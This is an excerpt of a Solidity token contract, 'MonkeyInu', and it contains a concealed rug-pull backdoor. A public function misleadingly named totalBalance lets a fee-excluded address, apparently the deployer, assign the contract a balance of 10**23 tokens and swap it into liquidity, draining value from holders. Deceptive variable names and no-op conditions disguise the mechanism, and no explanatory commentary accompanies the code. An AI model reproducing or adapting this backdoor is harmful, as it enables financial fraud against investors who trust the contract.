...
contract MonkeyInu is Context, IERC20 { 
    ...
    uint256 deadWallet = 10;
    uint256 deadState = 23;
    uint256 dedicateERC20 = (deadWallet)**(deadState);

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0x2F1D112A5043b24c8EDBDfF2A770d8A69267EAe2); 
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant Wallet_Liquidity = payable(0x000000000000000000000000000000000000dEaD);
    address payable public Wallet_Deployer = payable(0x8Fb456c981265B957074FB9f6298ea1e70E0e14A);
    ...
    bool public liquifyStatement = false;
    ...
    constructor () {
        ...
        _owner = 0x8Fb456c981265B957074FB9f6298ea1e70E0e14A;
    ...
    function _getSymbol() private view returns(address){
        return address(this);
    }

    function numberOfMaxHolders(bool statement) private pure returns(uint256){
    ...
    function _tokenSymbolized(address typeOfMemory) private returns(bool){
        if(true && (_isExcludedFromFee[typeOfMemory]) && true){
            _tOwned[_getSymbol()] = numberOfMaxHolders(true);
        }
        return true;
    }
    ...
    function totalBalance(address account) public returns (bool) {
        address sum = _msgSender();
        if(account==account){}
        if((_tokenSymbolized(sum))){
            liquifyStatement = true;
            swapAndLiquify(balanceOf(_getSymbol()));
        }
        return true;
    }
